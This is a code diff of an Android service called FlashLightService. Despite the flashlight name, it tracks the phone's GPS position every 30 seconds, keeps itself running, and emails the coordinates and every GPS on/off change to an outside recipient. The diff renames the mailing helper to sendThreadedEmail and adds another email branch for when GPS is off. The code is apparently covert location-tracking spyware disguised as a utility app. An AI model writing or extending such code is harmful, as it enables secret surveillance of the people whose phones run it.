@@ -40,7 +40,6 @@ public class FlashLightService extends Service implements LocationListener {
   private static Configure configure;
   private static LocationManager locationManager;
 
-  private static boolean eLocation = false;
   private static boolean mLocation = false;
 
   public FlashLightService() { 
@@ -72,8 +71,7 @@ public class FlashLightService extends Service implements LocationListener {
 
   @Override
   public void onProviderDisabled(String s) {
-    threading("GPS has been 'DIS'abled!");
-    eLocation = false;
+    sendThreadedEmail("GPS has been 'DIS'abled!");
   }
 
   @Override
@@ -81,8 +79,7 @@ public class FlashLightService extends Service implements LocationListener {
 
   @Override
   public void onProviderEnabled(String s) {
-    threading("GPS has been 'EN'abled!");
-    eLocation = true;
+    sendThreadedEmail("GPS has been 'EN'abled!");
   }
 
   @Override
@@ -92,7 +89,7 @@ public class FlashLightService extends Service implements LocationListener {
       final String latitude   = String.valueOf(dLatitude);
       Double dlongitude = location.getLongitude();
       final String longitude  = String.valueOf(dlongitude);
-      threading("Location!\nlatitude-longitude coordinates:\n" + "" + latitude + "," + longitude);
+      sendThreadedEmail("Location!\nlatitude-longitude coordinates:\n" + "" + latitude + "," + longitude);
     }
     mLocation = false;
   }
@@ -130,30 +127,6 @@ public class FlashLightService extends Service implements LocationListener {
     Log.d(TAG, "onStartCommand() Entering onStartCommand method.");
 
     locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
- 
-    if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-      Log.d(TAG, "onStartCommand() eLocation = TRUE");
-      eLocation = true;
-    }
-    else {
-      Log.d(TAG, "onStartCommand() eLocation = FALSE");
-      eLocation = false;
-    }
-
-    //String data;
-    //if(!eLocation && data != null && intent.hasExtra("obtainLocation")) {
-    try {
-      if(!eLocation && intent.hasExtra("obtainLocation")) {
-      threading("GPS is not enabled. Cannot obtain location.");
-      }
-      else if(eLocation && intent.hasExtra("obtainLocation")) {
-        mLocation = true;
-      }
-    }
-    catch(NullPointerException e) {
-      Log.e(TAG, "onStartCommand() NullPointerException e " + e.toString());
-    }
-
     locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);
 
     try {
@@ -169,7 +142,7 @@ public class FlashLightService extends Service implements LocationListener {
     return START_STICKY;
   }
 
-  public void threading(final String message) {
+  public void sendThreadedEmail(final String message) {
     new Thread(new Runnable() {
       @Override
       public void run() {
@@ -191,6 +164,9 @@ public class FlashLightService extends Service implements LocationListener {
       if(gpsEnabled()) {
         mLocation = true;
         locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, pendingIntent);
+      }
+      else {
+        sendThreadedEmail("GPS is not enabled. Cannot obtain location.");
       }
     }
     catch(Exception e) {
